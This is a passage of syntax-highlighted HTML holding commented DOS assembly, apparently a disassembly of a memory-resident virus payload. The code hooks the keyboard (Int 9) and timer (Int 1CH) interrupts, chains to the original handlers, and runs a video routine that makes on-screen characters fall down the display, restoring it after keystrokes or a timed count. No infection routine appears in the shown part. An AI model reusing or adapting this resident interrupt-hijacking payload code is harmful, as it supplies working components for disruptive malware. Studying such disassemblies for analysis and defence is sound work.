    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I09_OF</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save old Int 9 offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; Get current segment</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0026</span><span class="sc0">       </span><span class="sc1">; Install as Int 9 segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I09_SG</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save old Int 9 segment</span><span class="sc0">
</span><span class="sc5">BP0850</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0050H</span><span class="sc0">        </span><span class="sc1">; Length of one line</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">24</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; Last line address</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DW0005</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">   </span><span class="sc1">; Address line store</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store line numbers</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">       </span><span class="sc1">; Set off switches above three</span><span class="sc0">
</span><span class="sc5">BP0860</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0990</span><span class="sc0">          </span><span class="sc1">; Pass on to original Int 1CH</span><span class="sc0">

</span><span class="sc5">BP0870</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0820</span><span class="sc0">

    </span><span class="sc1">; Interrupt 1CH routine</span><span class="sc0">

</span><span class="sc5">BP0880</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I09BSY</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Clear Int 9 busy switch</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">      </span><span class="sc1">; Get switches</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">60H</span><span class="sc0">          </span><span class="sc1">; Test switches six and seven</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0870</span><span class="sc0">          </span><span class="sc1">; Branch if either is on</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">          </span><span class="sc1">; Test switch eight</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0910</span><span class="sc0">          </span><span class="sc1">; Branch if off</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">RSTCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Is restore count off?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0890</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc5">RSTCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">     </span><span class="sc1">; Increment restore count</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">RSTCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0444H</span><span class="sc0">   </span><span class="sc1">; Have we reached target (1 minute)?</span><span class="sc0">
    </span><span class="sc6">JL</span><span class="sc0">  </span><span class="sc5">BP0890</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP1030</span><span class="sc0">          </span><span class="sc1">; Video display routine</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0990</span><span class="sc0">          </span><span class="sc1">; Pass on to original Int 1CH</span><span class="sc0">

</span><span class="sc5">BP0890</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">18H</span><span class="sc0">          </span><span class="sc1">; Test switches four and five</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0900</span><span class="sc0">          </span><span class="sc1">; Branch if both off</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc5">DSPCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">     </span><span class="sc1">; Decrement display count</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0900</span><span class="sc0">          </span><span class="sc1">; Branch if not finished</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0E7H</span><span class="sc0">    </span><span class="sc1">; Set off switch three</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">     </span><span class="sc1">; Set on switch seven</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Test switch four</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0900</span><span class="sc0">          </span><span class="sc1">; Branch if off</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">     </span><span class="sc1">; Set on switch six</span><span class="sc0">
</span><span class="sc5">BP0900</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0990</span><span class="sc0">          </span><span class="sc1">; Pass on to original Int 1CH</span><span class="sc0">

</span><span class="sc5">BP0910</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Toggle switch one</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Test previous state</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0900</span><span class="sc0">          </span><span class="sc1">; Branch if off</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc5">VIDADR</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">      </span><span class="sc1">; Get video RAM segment</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Start of line</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DB086E</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Set past second line off</span><span class="sc0">
</span><span class="sc5">BP0920</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">DW0005</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get current line number</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; First line?</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0930</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0">    </span><span class="sc1">; Is character a blank?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0930</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0FF60H</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0"> </span><span class="sc1">; Is char on line above a space?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0930</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0720H</span><span class="sc0">        </span><span class="sc1">; White on black space</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0FF60H</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Swap with line above</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Store new character this line</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Next line</span><span class="sc0">
</span><span class="sc5">BP0930</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">25</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; Past last line?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0940</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0">    </span><span class="sc1">; Is character a blank</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0940</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0970</span><span class="sc0">          </span><span class="sc1">; ?</span><span class="sc0">
</span><span class="sc5">BP0940</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">24</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; Address last line</span><span class="sc0">
</span><span class="sc5">BP0950</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0">    </span><span class="sc1">; Is character a blank?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0960</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0FF60H</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0"> </span><span class="sc1">; Is char on line above a space?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0970</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
</span><span class="sc5">BP0960</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Previous line</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; First line?</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0950</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
</span><span class="sc5">BP0970</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DW0005</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  </span><span class="sc1">; Save current line number</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">DB086E</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc1">; Set past second line indicator</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Next character position</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; End of line?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0920</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">DB086E</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Past second line?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0980</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">     </span><span class="sc1">; Set on switch eight</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">RSTCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Start restore count</span><span class="sc0">
</span><span class="sc5">BP0980</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">BP0990</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump to Int 1CH</span><span class="sc0">
</span><span class="sc5">I1C_OF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0FF53H</span><span class="sc0">          </span><span class="sc1">; Original Int 1CH offset</span><span class="sc0">
</span><span class="sc5">I1C_SG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0F000H</span><span class="sc0">          </span><span class="sc1">; Original Int 1CH segment</span><span class="sc0">

    </span><span class="sc1">; Signal end of interrupt</span><span class="sc0">

</span><span class="sc5">BP1000</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">          </span><span class="sc1">; \ End of interrupt</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">IRET</span><span class="sc0">

    </span><span class="sc1">; Interrupt 9 routine</span><span class="sc0">

</span><span class="sc5">BP1010</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">60H</span><span class="sc0">          </span><span class="sc1">; Get keyboard token</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">KEYTOK</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Save keyboard token</span><span class="sc0">
    </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">61H</span><span class="sc0">          </span><span class="sc1">; Get port B</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Save port B</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">          </span><span class="sc1">; \ Acknowledge keyboard</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; \ Restore Port B</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">I09BSY</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Test Int 9 busy switch</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I09BSY</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Set Int 9 busy switch on</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP1000</span><span class="sc0">          </span><span class="sc1">; Branch if on already</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">KEYTOK</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">      </span><span class="sc1">; Get keyboard token</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0F0H</span><span class="sc0">         </span><span class="sc1">; \ ? discard this character</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP1000</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">7FH</span><span class="sc0">          </span><span class="sc1">; Set off top bit</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">KEYNUM</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">      </span><span class="sc1">; Same as last character?</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">KEYNUM</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Save key number</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP1000</span><span class="sc0">          </span><span class="sc1">; Branch if same as last</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">RSTCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Is restore count off?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP1020</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">RSTCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Restart restore count</span><span class="sc0">
</span><span class="sc5">BP1020</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP1030</span><span class="sc0">          </span><span class="sc1">; Video display routine</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP1000</span><span class="sc0">          </span><span class="sc1">; End of interrupt</span><span class="sc0">

    </span><span class="sc1">; Video display routine</span><span class="sc0">

</span><span class="sc5">BP1030</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DSPCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0028H</span><span class="sc0">   </span><span class="sc1">; Set up short display count (2+ secs)</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">     </span><span class="sc1">; Test switch eight</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP1000</span><span class="sc0">          </span><span class="sc1">; Branch if off</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DB0870</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Set character going down</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc5">VIDADR</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">      </span><span class="sc1">; Get video RAM segment</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">     </span><span class="sc1">; Test switch five</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP1070</span><span class="sc0">          </span><span class="sc1">; Branch if on</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">     </span><span class="sc1">; Set on switch five</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Start of line</span><span class="sc0">
</span><span class="sc5">BP1040</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">24</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; Address last line</span><span class="sc0">
</span><span class="sc5">BP1050</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0">    </span><span class="sc1">; Is character a blank?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP1060</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Previous line</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP1050</span><span class="sc0">          </span><span class="sc1">; Branch if not </span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">24</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; Address last line</span><span class="sc0">
</span><span class="sc5">BP1060</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Next line</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DW0005</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  </span><span class="sc1">; Save current line number</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FLENLO</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  </span><span class="sc1">; Save last line number</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; \ Next character position</span><span class="sc0">
